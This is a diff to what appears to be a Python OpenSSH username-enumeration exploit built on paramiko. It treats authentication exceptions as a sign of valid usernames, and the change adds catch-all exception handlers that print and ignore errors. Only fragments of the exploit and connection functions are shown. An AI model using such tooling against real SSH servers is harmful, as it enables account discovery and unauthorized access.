@@ -83,8 +83,11 @@ def exploit(hostname, username, port, validuser = ""):
                 
         except paramiko.ssh_exception.AuthenticationException:
                 #Exception for if the server function crashes meaning the username is true
-                return (username, True)
-                
+                return (username, True)        
+        except Exception as ex:
+            print (ex)
+            pass      
+                   
         #Successful auth(?)
         raise Exception("There was an error. Is this the correct version of OpenSSH?"+ Style.RESET_ALL)
     
@@ -105,6 +108,9 @@ def exploit(hostname, username, port, validuser = ""):
     except socket.error:
         print('[-] Connecting to host failed. Please check the specified host and port.'+ Style.RESET_ALL)
         sys.exit(1)
+    except Exception as ex:
+        print (ex)
+        pass 
 
     #Check if the host is vulnerable to this CVE
     if not checkVulnerable():
@@ -143,6 +149,9 @@ def ssh_connect(hostname, port, username, password, code = 0):
     except socket.error as e:
         #[-] Connection Failed ... Host Down
         code = 2
+    except Exception as ex:
+        print (ex)
+        pass 
     
     ssh2.close()
     return code
